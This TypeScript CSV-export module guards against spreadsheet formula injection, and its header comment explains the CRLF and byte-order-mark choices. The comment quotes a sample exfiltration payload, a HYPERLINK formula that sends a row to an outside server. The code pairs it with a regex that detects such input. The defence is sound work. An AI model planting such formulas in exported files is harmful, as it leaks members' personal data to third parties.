/**
 * CSV, written for the two programs that will actually open it: Excel and Google Sheets.
 *
 * Three decisions, each of which has a failure behind it:
 *
 * **Formula injection.** A cell beginning `=`, `+`, `-`, `@` or a control character is a formula
 * in both programs, and `=HYPERLINK("https://…"&A2)` in a member's display name becomes a request
 * carrying the row to somebody else's server the moment a staff member opens the file. Quoting
 * does not help — the quotes are CSV syntax and are gone by the time the formula is parsed — so
 * the cell is prefixed with an apostrophe, which both programs read as "this is text" (§5.26 asks
 * for the same guard the portal uses).
 *
 * **CRLF**, per RFC 4180, which is what Excel expects.
 *
 * **A byte-order mark.** Without it Excel on Windows reads a UTF-8 file as the system code page,
 * and every member whose name is not ASCII is mangled in a file about them.
 */

/** Characters that make a leading character dangerous rather than decorative. */
const FORMULA_START = /^[=+\-@\t\r]/;

/** Characters that force a cell to be quoted. */
const NEEDS_QUOTES = /["\n\r,]/;

const text = (value: unknown): string => {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return value.toISOString();
  if (typeof value === 'boolean') return value ? 'true' : 'false';
  if (Array.isArray(value)) return value.map(entry => text(entry)).join(' ');

  return String(value);
};

/** One cell: guarded, then quoted if it needs to be. */
export const csvCell = (value: unknown): string => {
  const raw = text(value);
  const guarded = FORMULA_START.test(raw) ? `'${raw}` : raw;

  return NEEDS_QUOTES.test(guarded) ? `"${guarded.replaceAll('"', '""')}"` : guarded;
};

export const csvRow = (values: unknown[]): string => values.map(csvCell).join(',') + '\r\n';

/** The mark Excel needs to believe the file is UTF-8. */
export const CSV_BOM = '﻿';

export const CSV_MIME = 'text/csv; charset=utf-8';
